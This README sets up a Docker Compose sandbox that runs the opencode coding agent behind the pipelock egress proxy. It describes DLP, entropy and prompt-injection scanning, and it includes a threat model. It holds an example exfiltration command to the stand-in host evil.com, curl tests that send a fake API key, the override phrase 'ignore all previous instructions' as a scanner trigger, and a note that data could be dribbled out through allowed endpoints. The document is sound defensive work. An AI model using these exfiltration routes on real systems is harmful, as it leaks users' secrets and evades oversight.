# opencode + pipelock sandbox

Two-container Docker Compose setup that runs [opencode](https://opencode.ai)
behind [pipelock](https://github.com/luckyPipewrench/pipelock), with opencode
zen as the LLM provider.

## Topology

```
┌─────────────────────────┐         ┌──────────────────────────┐
│  agent container        │         │  pipelock container       │
│  (network: internal)    │         │  (networks: internal,     │
│                         │  HTTP   │              egress)      │
│  - opencode TUI         │────────>│  - 7-layer scanner        │
│  - your code            │  proxy  │  - egress allowlist       │
│  - NO direct internet   │         │  - DLP + entropy          │
│                         │         │  - response injection scan│
└─────────────────────────┘         └────────────┬─────────────┘
                                                  │
                                                  ▼
                                          opencode.ai/zen
                                          github.com, npm, …
```

The `internal` Docker network is declared `internal: true` so it has no NAT
to the host's internet. The agent container is attached to that network
**only**, so its sole route off the host is `pipelock:8888`. This is the
property that makes the sandbox actually mean something.

## Setup

```sh
# 1. Get an API key at https://opencode.ai/zen and put it in .env
cp .env.example .env
$EDITOR .env

# 2. Put your project in ./workspace (it's bind-mounted into /workspace)
mkdir -p workspace
# (the workspace already contains AGENTS.md telling opencode about pipelock)

# 3. Build the agent image (bun + opencode + pipelock binary baked in).
#    First build pulls Go and compiles pipelock from source — ~2 minutes.
docker compose build agent

# 4. Boot pipelock, then drop into the agent shell.
docker compose up -d pipelock
docker compose run --rm agent

# Inside the container shell:
opencode
```

To bump pipelock or opencode, edit the `args:` under `agent.build` in
`docker-compose.yaml` and run `docker compose build --no-cache agent`.

## Verify pipelock is up (from the host)

Pipelock exposes a health and stats API on `127.0.0.1:8888`.

```sh
# Is it running?
curl -s http://127.0.0.1:8888/health | jq .

# What has it seen so far?
curl -s http://127.0.0.1:8888/stats | jq .
```

Expected health response:

```json
{
  "status": "healthy",
  "version": "2.3.0",
  "mode": "balanced",
  "uptime_seconds": 42,
  "dlp_patterns": 51,
  "response_scan_enabled": true
}
```

## Seeing pipelock in action with opencode

Everything opencode sends to the LLM and every package it installs routes
through pipelock. Here is how to watch it happen in real time.

**Terminal 1 — tail the pipelock audit log:**

```sh
docker logs -f pipelock | jq --unbuffered '.'
```

**Terminal 2 — start the agent and run opencode:**

```sh
docker compose run --rm agent
# inside the shell:
opencode
```

The moment opencode makes its first request to opencode.ai/zen you will see
JSON log lines in Terminal 1. Each line looks like this:

```json
{
  "level": "info",
  "component": "pipelock",
  "event": "allowed",
  "method": "POST",
  "url": "https://api.opencode.ai/v1/chat/completions",
  "agent": "_default",
  "time": "2026-05-07T15:30:00Z",
  "message": "request allowed"
}
```

To see only blocked requests:

```sh
docker logs -f pipelock | jq --unbuffered 'select(.event == "blocked")'
```

## Fetching web content through pipelock

The agent container has no direct internet access. opencode fetches pages
through pipelock's `/fetch` endpoint, which runs DLP and response-injection
scanning before returning content to the model.

> **Address quick reference:**
> - From the **host**: `http://127.0.0.1:8888` (port-forwarded)
> - From **inside the agent container**: `http://pipelock:8888` (internal network)
> `127.0.0.1` inside the container is the container's own loopback — pipelock is not there.

```sh
# From the host:
curl -s "http://127.0.0.1:8888/fetch?url=https://example.com" | jq .

# From inside the agent container:
curl -s -H "X-Pipelock-Agent: opencode" "http://pipelock:8888/fetch?url=https://example.com" | jq .
```

The response includes the extracted text content and a `blocked` field:

```json
{
  "url": "https://example.com",
  "status_code": 200,
  "content_type": "text/html",
  "title": "Example Domain",
  "content": "Example Domain\nThis domain is for use in illustrative examples…",
  "blocked": false
}
```

Try fetching a pastebin URL and watch it get blocked:

```sh
# From the host:
curl -s "http://127.0.0.1:8888/fetch?url=https://pastebin.com/raw/test" | jq .

# From inside the agent container:
curl -s "http://pipelock:8888/fetch?url=https://pastebin.com/raw/test" | jq .
```

## DLP: pipelock catching a credential in a request URL

Pipelock scans the full URL of outbound requests for credential patterns.
**This only works for plain HTTP** — HTTPS traffic uses a CONNECT tunnel, so
pipelock sees only the hostname, not the URL path or query string. Use an
allowlisted domain (`github.com`) so the request isn't blocked by the
allowlist before DLP gets a chance to scan it.

```sh
FAKE_KEY="sk-ant-api03-FAKEKEY1234567890abcdefghijklmnopqrstuvwxyz_PLACEHOLDER"

# From the host:
curl -si -x http://127.0.0.1:8888 -H "X-Pipelock-Agent: opencode" "http://github.com/x?key=${FAKE_KEY}" | head -3

# From inside the agent container:
curl -si -x http://pipelock:8888 -H "X-Pipelock-Agent: opencode" "http://github.com/x?key=${FAKE_KEY}" | head -3
```

You should see `403 Forbidden`. Confirm it in the stats:

```sh
curl -s http://127.0.0.1:8888/stats | jq '.top_scanners'
```

## Response scanning and MCP scanning

Pipelock scans two things for prompt-injection content:

1. **Fetch proxy responses** — anything returned by `GET /fetch?url=...` is
   scanned before the content reaches the model.
2. **MCP tool responses** — when opencode calls a tool on the wrapped MCP
   server (`pipelock mcp proxy`), pipelock intercepts the server's response
   and scans it before the model sees it.

### Demoing fetch response scanning

To see the scanner fire, fetch a public URL whose content matches an injection
pattern. Any URL that returns text containing `ignore all previous instructions`
(or the other patterns in `pipelock.yaml`) will trigger it.

If you have a GitHub Gist or any public URL with that text, from inside the
agent container:

```sh
curl -s "http://pipelock:8888/fetch?url=https://YOUR_URL_HERE" | jq .
```

You will see `"blocked": true` in the JSON response and a blocked event in the
pipelock log.

### Why asking opencode to read evil.txt doesn't demo pipelock

When you ask opencode to read a local file, it uses its built-in Read tool —
a direct syscall that never touches pipelock. The MCP layer is only involved
when opencode invokes an MCP tool explicitly. For local files, opencode prefers
its native tools.

Separately: opencode's model will often recognize and refuse an obvious
injection string on its own — which is the right outcome, but it's the model's
judgment at work, not pipelock. Pipelock's scanning is a second, independent
layer for when the model's judgment fails or is bypassed.

### What MCP scanning actually protects

The `pipelock mcp proxy` wrapper is most useful for MCP servers that fetch
external content — e.g. a web-search MCP server or a database MCP server
that returns user-controlled data. It intercepts the raw response from the
upstream server before the model processes it, providing a defense-in-depth
layer that doesn't depend on model behavior.

## Hands-on attack scenarios

Three scripts in `attacks/` try to exfiltrate a fake secret through pipelock.
Each one is supposed to fail. Run them from inside the agent container:

```sh
docker compose run --rm agent
cd /workspace/attacks

sh 01-blocklist.sh   # naive curl to pastebin — blocked by domain list
sh 02-dlp.sh         # credential in URL param — blocked by DLP regex
sh 03-entropy.sh     # base64-encoded blob — blocked by entropy threshold
```

Watch each block land in real time on the host:

```sh
docker logs -f pipelock | jq --unbuffered 'select(.event == "blocked")'
```

See `attacks/README.md` for bypass ideas and what each defense actually
proves (and doesn't).

## Stats snapshot after a session

After running opencode for a few minutes, pull a stats summary:

```sh
curl -s http://127.0.0.1:8888/stats | jq '{total: .requests.total, blocked: .requests.blocked, allowed: .requests.allowed, tunnels: .tunnels, top_agents: .agents, top_scanners: .top_scanners}'
```

The `agents` field shows traffic broken down by `X-Pipelock-Agent` header value — this is how you confirm opencode's traffic is actually flowing through the proxy and not going direct.

## What's protected

**Strong:**

- **Direct exfiltration** (`curl evil.com -d $SECRET`) — agent has no route
  to `evil.com` at all. The Docker network drops the packet before pipelock
  even sees it.
- **SSRF / metadata theft** — pipelock refuses to resolve into RFC1918,
  link-local, or loopback ranges, even if requested via DNS rebinding.
- **Naive secret leaks via URL** — DLP scans for known key formats; entropy
  scanner catches base64-encoded blobs in URL segments.
- **Prompt injection in MCP responses** — the filesystem MCP server is
  wrapped in `pipelock mcp proxy`, so anything it returns is scanned before
  reaching the model.

**Moderate:**

- **Sophisticated exfil** — a determined attacker who controls the model
  could chunk, encrypt, and dribble data through allowed endpoints
  (github.com gists, npm publish, …). Pipelock's rate limiter and entropy
  scanner raise the bar but don't make this impossible.

**Not protected:**

- **Anything inside the container** — opencode has full read/write on
  `/workspace` and `bun install` runs arbitrary npm postinstall scripts.
  Run `pipelock integrity check ./workspace` from the host between sessions
  if you care about file tampering.
- **Compromise of the LLM API itself** — if the response from opencode zen
  contains malicious tool-calls, those execute inside the agent container.
  The container drops capabilities and `no-new-privileges`, but it's not a
  full sandbox.

## Honest caveats

1. **Pipelock is early-stage** (v0.1.4, 29 stars, one named maintainer at
   time of writing). The architecture is sensible but the code hasn't been
   widely audited. Read it yourself before trusting it with anything you
   actually care about.

2. **The MCP wrapper assumes pipelock is on PATH inside the agent
   container.** The included `Dockerfile` handles this — it builds pipelock
   from source in a Go stage and copies the binary into the bun runtime.
   `opencode.json`'s `mcp.filesystem.command` points at
   `/etc/pipelock/pipelock.yaml`, which is bind-mounted from the host so
   both containers share one config.

3. **HTTP_PROXY only catches well-behaved clients.** opencode itself talks
   to opencode.ai zen via Node's built-in fetch, which respects
   `HTTPS_PROXY` — so that traffic does flow through pipelock. But native
   binaries that ignore proxy env vars would not. The internal-network
   constraint is what saves you, not the env vars.

4. **The fetch proxy and the egress proxy are the same listener.** Pipelock
   runs one HTTP server on `:8888` that handles both `GET /fetch?url=...`
   (content browsing for the agent) and forward-proxy CONNECT-style traffic
   from `HTTP_PROXY`. This is fine but worth knowing if you're reading the
   audit logs.

## Quick reference

```sh
# Tail all pipelock traffic
docker logs -f pipelock | jq --unbuffered '.'

# Tail blocked requests only
docker logs -f pipelock | jq --unbuffered 'select(.event == "blocked")'

# Live stats
curl -s http://127.0.0.1:8888/stats | jq .

# Health check
curl -s http://127.0.0.1:8888/health | jq .

# Fetch a URL through pipelock (from the host)
curl -s "http://127.0.0.1:8888/fetch?url=https://example.com" | jq .

# Test DLP with a fake key — must use http:// (HTTPS tunnels hide URL params from DLP)
curl -si -x http://127.0.0.1:8888 "http://github.com/x?key=sk-ant-api03-FAKEKEY1234567890abcdefghijklmnopqrstuvwxyz_PLACEHOLDER" | head -3

# Reload pipelock config without restarting (note: forward_proxy changes require full restart)
docker kill --signal SIGHUP pipelock
```
